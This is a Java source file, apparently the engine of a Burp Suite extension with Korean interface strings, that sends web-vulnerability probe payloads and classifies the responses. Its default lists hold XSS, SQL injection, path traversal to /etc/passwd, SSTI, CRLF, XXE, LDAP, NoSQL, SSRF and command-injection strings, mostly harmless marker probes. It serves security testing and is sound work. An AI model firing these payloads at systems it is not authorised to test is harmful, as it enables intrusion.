package kr.payloadrunner;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.function.Consumer;
import java.util.regex.*;
import java.util.zip.*;

/** No browser execution, recursive crawling, redirects, or external callbacks. */
public final class Engine {
 public static final String MARK="§PAYLOAD§";
 public static final int LIMIT=262_144;
 public static final int RETAIN=65_536;
 public enum Profile {XSS, SQLI, UPLOAD_NAME, UPLOAD_BODY, DOWNLOAD, SSTI, TRAVERSAL, REDIRECT, CRLF, XXE, XPATH, LDAP, NOSQL, SSRF, COMMAND, CUSTOM}
 public static String label(Profile p){return switch(p){
  case XSS->"XSS";case SQLI->"SQL Injection";case UPLOAD_NAME->"파일 업로드 · 파일명";case UPLOAD_BODY->"파일 업로드 · 내용";case DOWNLOAD->"파일 다운로드";
  case SSTI->"SSTI / 표현식 삽입";case TRAVERSAL->"경로 탐색 / LFI";case REDIRECT->"오픈 리다이렉트";case CRLF->"CRLF / 응답 헤더 삽입";case XXE->"XML 엔티티 / XXE";case XPATH->"XPath Injection";case LDAP->"LDAP Injection";case NOSQL->"NoSQL Injection";case SSRF->"SSRF";case COMMAND->"명령어 삽입";case CUSTOM->"사용자 정의";
 };}
 public static String hint(Profile p){return switch(p){
  case XXE->"XML 본문 전체를 표시 · RAW · 내부 엔티티 확장은 XXE 확정 아님";
  case NOSQL->"JSON 객체/조건 전체를 표시 · RAW · 문자열 값 검사라면 JSON 사용";
  case CRLF->"쿼리 값을 표시 · URL · 목록의 {{CRLF}}가 실제 CRLF로 치환됨";
  case SSRF->"URL 값을 표시 · 실습/직접 관리하는 URL로 목록 수정 · 서버 요청 로그로 확인";
  case SSTI->"입력값을 표시 · 고유 마커 사이의 산술식 평가를 비교";
  case COMMAND->"입력값을 표시 · printf 출력만 확인 · 셸/OS에 따라 미탐 가능";
  case REDIRECT->"이동 URL 값을 표시 · Location 헤더 비교 · 자동 이동 없음";
  case TRAVERSAL,DOWNLOAD->"파일 경로/ID 값을 표시 · 기대 문자열로 테스트 파일 내용 확인";
  case CUSTOM->"목록 직접 편집 · 기대 문자열은 관찰 근거이며 취약점 확정 아님";
  default->"표시한 값 한 곳만 변경 · 유형 변경 시 기본 목록/인코딩으로 초기화";
 };}
 public enum Encoding {URL, RAW, JSON}
 public interface Transport {byte[] send(byte[] request)throws Exception;}
 public record Config(Profile profile, Encoding encoding, String template, String baseline, List<String> payloads, int intervalMs, int budget, String proof) {
  public Config {payloads=List.copyOf(payloads);if(budget<1||budget>1000||intervalMs<0||intervalMs>60000)throw new IllegalArgumentException("요청 한도/간격 범위 오류");if(payloads.isEmpty()||payloads.size()>500)throw new IllegalArgumentException("페이로드는 1~500줄로 설정하세요");render(template,baseline,encoding);}
 }
 public record Response(int status, int wireLength, String mime, String text, boolean truncated, byte[] raw, boolean decoded) {
  public Response {raw=raw.clone();}
 }
 public record Row(int index,String payload,long millis,Response response,String verdict,String evidence,byte[] request) {
  public Row {request=request.clone();}
  public String browserExecutionStatus(){return "NOT_RUN";}
 }
 public record Summary(int requests,int completed,boolean stopped,boolean budgetReached,String reason){public Summary(int r,int c,boolean s,boolean b){this(r,c,s,b,"");}}
 public static boolean isTimeout(Throwable error){for(int i=0;error!=null&&i<20;i++,error=error.getCause())if(error instanceof java.util.concurrent.TimeoutException||error instanceof java.net.SocketTimeoutException||error instanceof java.net.http.HttpTimeoutException)return true;return false;}
 public static boolean stopStatus(int status){return status==401||status==403||status==429||status==503;}
 public static String stopReason(int status){return "HTTP "+status+" · 인증/차단/부하 응답으로 후속 요청 중단 · 취약점 부재를 의미하지 않음";}
 public static List<String> defaults(Profile p){return switch(p){
  case XSS->List.of("{{MARKER}}","<svg onload=console.log('{{MARKER}}')>","<img src=x onerror=console.log('{{MARKER}}')>","\"><svg onload=console.log('{{MARKER}}')>","'><img src=x onerror=console.log('{{MARKER}}')>","</textarea><svg onload=console.log('{{MARKER}}')>","<b data-probe=\"{{MARKER}}\">{{MARKER}}</b>","<svg/onload=console.log('{{MARKER}}')>//","\"><svg/onload=console.log('{{MARKER}}')>//","'><svg/onload=console.log('{{MARKER}}')>//");
  case SQLI->List.of("'","\"","{{BASE}}' AND '1'='1' -- ","{{BASE}}' AND '1'='2' -- ","{{BASE}} AND 1=1","{{BASE}} AND 1=2","{{BASE}}') AND ('1'='1","{{BASE}}') AND ('1'='2", "{{BASE}}%')) AND 1=1 -- ", "{{BASE}}%')) AND 1=2 -- ", "{{BASE}}%') AND 1=1 -- ", "{{BASE}}%') AND 1=2 -- ");
  case UPLOAD_NAME->List.of("probe-{{MARKER}}.txt","probe-{{MARKER}}.html","probe-{{MARKER}}.svg","probe-{{MARKER}}.jpg.txt","../probe-{{MARKER}}.txt","probe-{{MARKER}}.TXT");
  case UPLOAD_BODY->List.of("{{MARKER}}","<!doctype html><title>{{MARKER}}</title><b>{{MARKER}}</b>","<svg xmlns=\"http://www.w3.org/2000/svg\"><text y=\"20\">{{MARKER}}</text></svg>");
  case DOWNLOAD->List.of("../fixtures/download-marker.txt","../../../../etc/passwd","/etc/passwd","..\\..\\..\\..\\Windows\\win.ini","C:\\Windows\\win.ini");
  case SSTI->List.of("{{MARKER}}_{{731*919}}_END","{{MARKER}}_${731*919}_END","{{MARKER}}_#{731*919}_END","{{MARKER}}_<%=731*919%>_END","{{MARKER}}_{731*919}_END","{{MARKER}}_{{731*920}}_END","{{MARKER}}_${731*920}_END");
  case TRAVERSAL->List.of("../fixtures/download-marker.txt","../../../../etc/passwd","..%2f..%2f..%2f..%2fetc%2fpasswd","..\\..\\..\\..\\Windows\\win.ini");
  case REDIRECT->List.of("https://example.invalid/probe/{{MARKER}}","//example.invalid/probe/{{MARKER}}","https://example.invalid@localhost/","https://localhost@example.invalid/probe/{{MARKER}}");
  case CRLF->List.of("{{BASE}}{{CRLF}}X-PR-Probe: {{MARKER}}","{{BASE}}{{LF}}X-PR-Probe: {{MARKER}}","{{BASE}}%0d%0aX-PR-Probe:%20{{MARKER}}");
  case XXE->List.of("<!DOCTYPE r [<!ENTITY pr \"PR_XML_ENTITY&#95;EXPANDED\">]><r>&pr;</r>","<!DOCTYPE r [<!ENTITY pr SYSTEM \"file:///tmp/payload-runner-fixtures/download-marker.txt\">]><r>&pr;</r>");
  case XPATH->List.of("'","\"","{{BASE}}' or '1'='1","{{BASE}}' or '1'='2","{{BASE}}'] | //*[false()] | //*['");
  case LDAP->List.of("*","(",")","{{BASE}}*)(|(cn=*))","{{BASE}}*)(cn=PR_LDAP_NONEXISTENT)");
  case NOSQL->List.of("{\"$eq\":\"{{MARKER}}\"}","{\"$ne\":\"{{MARKER}}\"}","{\"$regex\":\"^PR_NOSQL_NONEXISTENT$\"}","{\"$pr_invalid_operator\":1}");
  case SSRF->List.of("http://127.0.0.1:19089/probe?m={{MARKER}}","http://localhost:19089/probe?m={{MARKER}}");
  case COMMAND->List.of("{{BASE}};printf 'PR_CMD_%s' '{{MARKER}}';","{{BASE}}|printf 'PR_CMD_%s' '{{MARKER}}'","{{BASE}}$(printf 'PR_CMD_%s' '{{MARKER}}')","{{BASE}}`printf 'PR_CMD_%s' '{{MARKER}}'`");
  case CUSTOM->List.of("{{MARKER}}");
 };}
 public static String expand(String p,String baseline,String marker){return p.replace("{{CRLF}}","\r\n").replace("{{LF}}","\n").replace("{{MARKER}}",marker).replace("{{BASE}}",baseline);}
 public static byte[] render(String template,String payload,Encoding encoding){
  int at=template.indexOf(MARK);if(at<0||template.indexOf(MARK,at+MARK.length())>=0)throw new IllegalArgumentException("요청에 §PAYLOAD§ 표시를 정확히 한 개 넣으세요");
  String prefix=template.substring(0,at);String suffix=template.substring(at+MARK.length());
  String encoded=switch(encoding){case URL->urlEncode(payload);case JSON->jsonContent(payload);case RAW->new String(payload.getBytes(StandardCharsets.UTF_8),StandardCharsets.ISO_8859_1);};
  // ISO-8859-1 provides a reversible byte view for a captured request, including multipart bytes.
  byte[] raw=(prefix+encoded+suffix).getBytes(StandardCharsets.ISO_8859_1);
  int split=headerEnd(raw);if(split<0)throw new IllegalArgumentException("CRLF 헤더/본문 경계가 없습니다");
  String head=new String(raw,0,split,StandardCharsets.ISO_8859_1);
  if(!head.split("\r\n",2)[0].matches("[A-Z]+ [^\r\n ]+ HTTP/1\\.[01]"))throw new IllegalArgumentException("HTTP/1 raw 요청 형식이 필요합니다");
  if(Pattern.compile("(?im)^Transfer-Encoding:").matcher(head).find())throw new IllegalArgumentException("chunked 요청은 지원하지 않습니다. Content-Length 요청을 사용하세요");
  if(Pattern.compile("(?im)^Content-Encoding:").matcher(head).find())throw new IllegalArgumentException("압축 요청 본문은 먼저 해제하세요");
  if(head.indexOf('\0')>=0)throw new IllegalArgumentException("헤더에 NUL 입력을 넣을 수 없습니다");
  byte[] body=Arrays.copyOfRange(raw,split+4,raw.length);
  head=String.join("\r\n",Arrays.stream(head.split("\r\n")).filter(line->!line.toLowerCase(Locale.ROOT).startsWith("content-length:")).toList());
  if(body.length>0||head.startsWith("POST ")||head.startsWith("PUT ")||head.startsWith("PATCH "))head+="\r\nContent-Length: "+body.length;
  try{var out=new ByteArrayOutputStream();out.write(head.getBytes(StandardCharsets.ISO_8859_1));out.write("\r\n\r\n".getBytes(StandardCharsets.US_ASCII));out.write(body);return out.toByteArray();}catch(IOException e){throw new IllegalStateException(e);}
 }
 static int headerEnd(byte[] raw){for(int i=0;i+3<raw.length;i++)if(raw[i]==13&&raw[i+1]==10&&raw[i+2]==13&&raw[i+3]==10)return i;return -1;}
 public static String urlEncode(String p){var s=new StringBuilder();for(byte b:p.getBytes(StandardCharsets.UTF_8)){int c=b&255;if((c>='a'&&c<='z')||(c>='A'&&c<='Z')||(c>='0'&&c<='9')||c=='-'||c=='_'||c=='.'||c=='~')s.append((char)c);else s.append(String.format("%%%02X",c));}return s.toString();}
 static String jsonContent(String p){var s=new StringBuilder();for(char c:p.toCharArray())switch(c){case '"'->s.append("\\\"");case '\\'->s.append("\\\\");case '\n'->s.append("\\n");case '\r'->s.append("\\r");case '\t'->s.append("\\t");default->{if(c<32||c>126)s.append(String.format("\\u%04x",(int)c));else s.append(c);}}return s.toString();}
 public static Response parse(byte[] raw)throws IOException {
  if(raw==null)throw new IOException("Burp가 응답을 반환하지 않았습니다");int split=headerEnd(raw);if(split<0)throw new IOException("유효한 HTTP 응답 헤더가 없습니다");
  String headers=new String(raw,0,split,StandardCharsets.ISO_8859_1);String[] line=headers.split("\r\n",2)[0].split(" ",3);int status;try{status=Integer.parseInt(line[1]);}catch(Exception e){throw new IOException("상태코드 파싱 실패");}
  String mime=header(headers,"Content-Type");String ce=header(headers,"Content-Encoding").toLowerCase(Locale.ROOT);byte[] body=Arrays.copyOfRange(raw,split+4,raw.length);boolean decoded=true;if(header(headers,"Transfer-Encoding").toLowerCase(Locale.ROOT).contains("chunked"))body=dechunk(body);
  try(InputStream in=ce.contains("gzip")?new GZIPInputStream(new ByteArrayInputStream(body)):ce.contains("deflate")?new InflaterInputStream(new ByteArrayInputStream(body)):new ByteArrayInputStream(body)){if(!ce.isBlank()&&!ce.contains("gzip")&&!ce.contains("deflate"))decoded=false;body=in.readNBytes(LIMIT+1);}
  boolean truncated=body.length>LIMIT;if(truncated)body=Arrays.copyOf(body,LIMIT);
  String text=kr.workbench.HttpText.decode(body,mime);return new Response(status,raw.length,mime,text,truncated,Arrays.copyOf(raw,Math.min(raw.length,RETAIN)),decoded);
 }
 static byte[] dechunk(byte[] bytes)throws IOException{var out=new ByteArrayOutputStream();int pos=0;while(pos<bytes.length){int end=pos;while(end+1<bytes.length&&!(bytes[end]==13&&bytes[end+1]==10))end++;if(end+1>=bytes.length)throw new IOException("chunked 크기 줄 누락");String line=new String(bytes,pos,end-pos,StandardCharsets.US_ASCII).split(";",2)[0];int size;try{size=Integer.parseInt(line.strip(),16);}catch(Exception e){throw new IOException("chunked 크기 오류");}pos=end+2;if(size==0)return out.toByteArray();if(size<0||size>16_777_216||size>bytes.length-pos-2||out.size()+size>16_777_216)throw new IOException("chunked 본문 크기 제한/잘림");out.write(bytes,pos,size);pos+=size;if(bytes[pos]!=13||bytes[pos+1]!=10)throw new IOException("chunked 경계 오류");pos+=2;}throw new IOException("chunked 종료 누락");}
 static String header(String h,String n){var m=Pattern.compile("(?im)^"+Pattern.quote(n)+":\\s*([^\r\n]*)").matcher(h);return m.find()?m.group(1).strip():"";}
 static final Pattern SQL=kr.workbench.SqlErrors.PATTERN;
 static final Pattern FILE=Pattern.compile("(?m)^(root:[^:\\r\\n]*:0:0:[^\\r\\n]*|\\[fonts\\]|\\[extensions\\])\\s*$");
 static final Pattern XPATH_ERROR=Pattern.compile("(?i)(XPathExpressionException|Invalid XPath expression|XPathEvalError|XPathSyntaxError)[^\\r\\n]{0,120}");
 static final Pattern LDAP_ERROR=Pattern.compile("(?i)(LDAPException|LdapException|javax\\.naming\\.directory\\.InvalidSearchFilterException|Bad search filter|LDAP filter syntax error)[^\\r\\n]{0,120}");
 static final Pattern NOSQL_ERROR=Pattern.compile("(?i)(MongoServerError|MongoError|MongoQueryException|com\\.mongodb\\.MongoCommandException)[^\\r\\n]{0,120}");
 static String responseHeaders(Response r){int end=headerEnd(r.raw);return end<0?"":new String(r.raw,0,end,StandardCharsets.ISO_8859_1);}
 static boolean fresh(Response b,Response r,String payload,String value){return !value.isEmpty()&&!payload.contains(value)&&r.text.contains(value)&&!b.text.contains(value);}
 static String hostOf(String value){try{return Objects.toString(new java.net.URI(value).getHost(),"").toLowerCase(Locale.ROOT);}catch(Exception e){return "";}}
 static String[] classify(Config c,Response b,Response r,String payload,String marker){
  if(r.status==401||r.status==403)return new String[]{"인증/인가 응답","HTTP 상태만으로 세션 만료·안전 확정 불가 · 사용자 확인 API·CSRF·업무 오류를 별도 대조하세요"};
  if(c.profile==Profile.REDIRECT&&r.status>=300&&r.status<400){String location=header(responseHeaders(r),"Location");String expected=hostOf(payload);if(!expected.isBlank()&&expected.equals(hostOf(location))&&!expected.equals(hostOf(header(responseHeaders(b),"Location"))))return new String[]{"리다이렉트 목적지 제어 후보","Location: "+location+" · 허용된 외부 이동인지 Repeater에서 확인"};}
  if(c.profile==Profile.CRLF&&header(responseHeaders(r),"X-PR-Probe").equals(marker)&&!header(responseHeaders(b),"X-PR-Probe").equals(marker))return new String[]{"응답 헤더 삽입 후보","응답 헤더 X-PR-Probe에 요청별 마커 발견. 본문 반사는 제외"};
  if(r.status>=300&&r.status<400)return new String[]{"리다이렉트","자동 추적하지 않음. 로그인 이동 여부를 확인하세요"};
  if(!r.decoded)return new String[]{"판정 불가","지원하지 않는 응답 Content-Encoding"};
  if(c.profile==Profile.SSTI){for(int factor:new int[]{919,920}){String expr="731*"+factor,expected=marker+"_"+(731*factor)+"_END";if(payload.contains(expr)&&fresh(b,r,payload,expected))return new String[]{"표현식 평가 후보",expected+" · 산술식이 평가됨. 엔진·서버 처리 위치 추가 확인 필요"};}}
  if(c.profile==Profile.COMMAND&&payload.contains("printf")&&fresh(b,r,payload,"PR_CMD_"+marker))return new String[]{"명령 출력 후보","printf의 조합된 출력 발견. 템플릿/일반 로직 가능성 재검증 필요"};
  if(c.profile==Profile.XXE&&payload.contains("<!ENTITY")&&fresh(b,r,payload,"PR_XML_ENTITY_EXPANDED"))return new String[]{"XML 엔티티 확장 관찰","내부 DTD 엔티티만 확장됨. 외부 엔티티/XXE 취약점 확정 근거 아님"};
  Pattern error=switch(c.profile){case XPATH->XPATH_ERROR;case LDAP->LDAP_ERROR;case NOSQL->NOSQL_ERROR;default->null;};
  if(error!=null){Matcher m=error.matcher(r.text);if(m.find()&&!error.matcher(b.text).find()&&!payload.contains(m.group()))return new String[]{label(c.profile)+" 오류 후보",m.group()+" · 오류 노출이며 인젝션 성공 확정 아님"};}
  if((c.profile==Profile.SSRF||c.profile==Profile.CUSTOM)&&r.status>=200&&r.status<300&&!c.proof.isBlank()&&fresh(b,r,payload,c.proof))return new String[]{"지정 응답 문자열 후보",c.proof+(c.profile==Profile.SSRF?" · 수신 서버 로그에서 요청 출처/마커 확인 필요":" · 일반 문자열 관찰이며 취약점 확정 아님")};
  if(c.profile==Profile.XSS&&payload.contains("<")&&payload.contains(marker)&&!b.text.contains(marker)&&r.mime.toLowerCase(Locale.ROOT).contains("text/html")){String context=XssReflection.context(r.text,marker);if(!context.isEmpty())return new String[]{"XSS 반사 후보","단계=후보 · 브라우저 실행=미확인 · "+context+" · 전체 입력의 동일 반사 없이 출력 문맥 관찰"};}
  if(c.profile==Profile.SQLI){Matcher m=SQL.matcher(r.text);if(m.find()&&!SQL.matcher(b.text).find()&&!payload.contains(m.group()))return new String[]{"SQL 오류 후보",m.group().substring(0,Math.min(160,m.group().length()))};}
  if(c.profile==Profile.DOWNLOAD||c.profile==Profile.TRAVERSAL||c.profile==Profile.XXE){if(!c.proof.isBlank()&&r.status==200&&fresh(b,r,payload,c.proof))return new String[]{"지정 파일 내용 발견",c.proof};Matcher m=FILE.matcher(r.text);if(r.status==200&&m.find()&&!FILE.matcher(b.text).find()&&!r.mime.toLowerCase(Locale.ROOT).contains("html")&&!payload.contains(m.group()))return new String[]{"파일 내용 후보",m.group().substring(0,Math.min(160,m.group().length()))};}
  if((c.profile==Profile.UPLOAD_BODY||c.profile==Profile.UPLOAD_NAME)&&r.status>=200&&r.status<300)return new String[]{"업로드 수락 후보","2xx 응답만 확인. 저장·접근·MIME·실행 여부는 후속 확인 필요"};
  if(c.profile==Profile.XSS&&r.text.contains(marker))return new String[]{"문자열 반사","실행 가능한 XSS 근거 아님"};
  if(r.status>=500)return new String[]{"서버 오류","HTTP "+r.status+"; 오류 자체는 취약점 확정 근거가 아님"};
  if(r.status!=b.status||Math.abs(r.text.length()-b.text.length())>Math.max(100,b.text.length()/5))return new String[]{"응답 변화","기준 "+b.status+" / "+b.text.length()+"자 → "+r.status+" / "+r.text.length()+"자"};
  return new String[]{"근거 없음",r.truncated?"본문이 256 KiB로 잘림. 미탐 가능":"검사한 응답에서 유형별 근거가 발견되지 않음"};
 }
 public static Summary run(Config c,Transport transport,AtomicBoolean stop,Consumer<Row> receive)throws Exception {
  int requests=0,complete=0;byte[] baselineRequest=render(c.template,c.baseline,c.encoding);if(stop.get())return new Summary(0,0,true,false);
  long t=System.nanoTime();Response baseline=parse(transport.send(baselineRequest));requests++;receive.accept(new Row(0,c.baseline,(System.nanoTime()-t)/1_000_000,compact(baseline),stopStatus(baseline.status)?baseline.status==401||baseline.status==403?"인증/인가 응답":"요청 제한/부하 응답":"기준 응답",stopStatus(baseline.status)?stopReason(baseline.status):"원래 값으로 요청한 비교 기준",baselineRequest));
  if(stopStatus(baseline.status))return new Summary(requests,0,true,false,stopReason(baseline.status));
  Map<String,Row> pairs=new HashMap<>();boolean stable=true,halted=false;int failures=0;String reason="검사 목록 완료";
  if(c.profile==Profile.SQLI&&c.budget>1&&!stop.get()) {delay(c.intervalMs,stop);if(stop.get())return new Summary(requests,complete,true,false);Response again=parse(transport.send(baselineRequest));requests++;stable=baseline.status==again.status&&baseline.text.equals(again.text);receive.accept(new Row(-1,c.baseline,0,compact(again),"기준 재검증",stable?"기준 본문/상태가 동일":"동적 응답: 조건 차이는 보수적으로 해석",baselineRequest));if(stopStatus(again.status))return new Summary(requests,0,true,false,stopReason(again.status));}
  for(int i=0;i<c.payloads.size()&&requests<c.budget&&!stop.get()&&!halted;i++){
   delay(c.intervalMs,stop);if(stop.get())break;String marker="PR_"+UUID.randomUUID().toString().replace("-","").substring(0,16);String payload=expand(c.payloads.get(i),c.baseline,marker);if(c.profile==Profile.XXE&&c.encoding==Encoding.RAW)payload=XmlProbe.adapt(payload,c.baseline);byte[] request=render(c.template,payload,c.encoding);t=System.nanoTime();Response response=null;String verdict,evidence;
   requests++;try{response=parse(transport.send(request));failures=0;String[] f=classify(c,baseline,response,payload,marker);verdict=f[0];evidence=f[1];}catch(Exception e){failures++;if(e instanceof InterruptedException){Thread.currentThread().interrupt();stop.set(true);}if(isTimeout(e)||failures>=3){halted=true;reason=isTimeout(e)?"응답 대기시간 초과/응답 없음":"연속 전송/분석 오류 3회";}verdict="전송/분석 오류";evidence=e.getClass().getSimpleName()+": "+Objects.toString(e.getMessage(),"");}
   if(c.profile==Profile.SQLI&&response!=null){
    String truePayload=payload.contains("'1'='2'")?payload.replace("'1'='2'","'1'='1'"):payload.contains("1=2")?payload.replace("1=2","1=1"):null;
    Row truth=truePayload==null?null:pairs.get(truePayload);
    if(truth!=null&&truth.response!=null&&stable&&usable(baseline)&&usable(truth.response)&&usable(response)&&baseline.status>=200&&baseline.status<300&&truth.response.status==baseline.status&&(response.status==baseline.status||response.status==404||response.status==410)&&sameBody(truth.response.text,truth.payload,baseline.text,c.baseline)&&(response.status!=truth.response.status||!sameBody(truth.response.text,truth.payload,response.text,payload))){
      if(response.status==baseline.status){verdict="SQL 조건 차이 후보";evidence="기준 2회 동일 · 참 응답은 기준과 동일 · 거짓 본문 차이 · SQLi 확정에는 Repeater 재검증 필요";}
      else if(requests<c.budget&&!stop.get()){
        delay(c.intervalMs,stop);if(!stop.get()){
          requests++;try{Response repeat=parse(transport.send(request));boolean repeated=usable(repeat)&&repeat.status==response.status&&repeat.text.equals(response.text);
            receive.accept(new Row(-2,payload,0,compact(repeat),"거짓 조건 재검증",repeated?"거짓 상태/본문 2회 동일":"거짓 응답 불안정 · 조건 후보 판정 보류",request));
            if(repeated){verdict="SQL 조건 차이 후보";evidence="기준 2회/거짓 2회 동일 · 참 "+truth.response.status+" = 기준 · 거짓 "+response.status+" · WAF/일반 필터 가능성 포함, SQLi 확정 아님";}
            if(stopStatus(repeat.status)){halted=true;reason=stopReason(repeat.status);}
          }catch(Exception ex){verdict="조건 재검증 불가";evidence="거짓 조건 반복 실패 · SQL 조건 후보 판정 보류";if(isTimeout(ex)||ex instanceof InterruptedException){halted=true;reason=evidence;if(ex instanceof InterruptedException){Thread.currentThread().interrupt();stop.set(true);}}}
        }
      }else evidence+=" · 재검증 예산 부족/중지: 상태 차이만으로 SQL 조건 후보를 판정하지 않음";
    }
   }
   Row row=new Row(i+1,payload,(System.nanoTime()-t)/1_000_000,response,verdict,evidence,request);if(payload.contains("1=1")||payload.contains("'1'='1'"))pairs.put(payload,row);receive.accept(new Row(row.index,row.payload,row.millis,compact(row.response),row.verdict,row.evidence,row.request));complete++;if(response!=null&&stopStatus(response.status)){halted=true;reason=stopReason(response.status);}
  }
  return new Summary(requests,complete,stop.get()||halted,requests>=c.budget&&complete<c.payloads.size(),reason);
 }
 static boolean usable(Response r){return r.decoded&&!r.truncated;}
 static boolean sameBody(String a,String pa,String b,String pb){return a.equals(b)||normalized(a,pa).equals(normalized(b,pb));}
 static String normalized(String text,String payload){if(payload.isEmpty())return text;return text.replace(payload, "").replace(urlEncode(payload), "").replace(payload.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;").replace("\"","&quot;"), "");}
 static Response compact(Response r){return r==null?null:new Response(r.status,r.wireLength,r.mime,r.text.substring(0,Math.min(RETAIN,r.text.length())),r.truncated||r.text.length()>RETAIN,r.raw,r.decoded);}
 static void delay(int millis,AtomicBoolean stop)throws InterruptedException{for(int n=millis;n>0&&!stop.get();n-=Math.min(100,n))Thread.sleep(Math.min(100,n));}
}
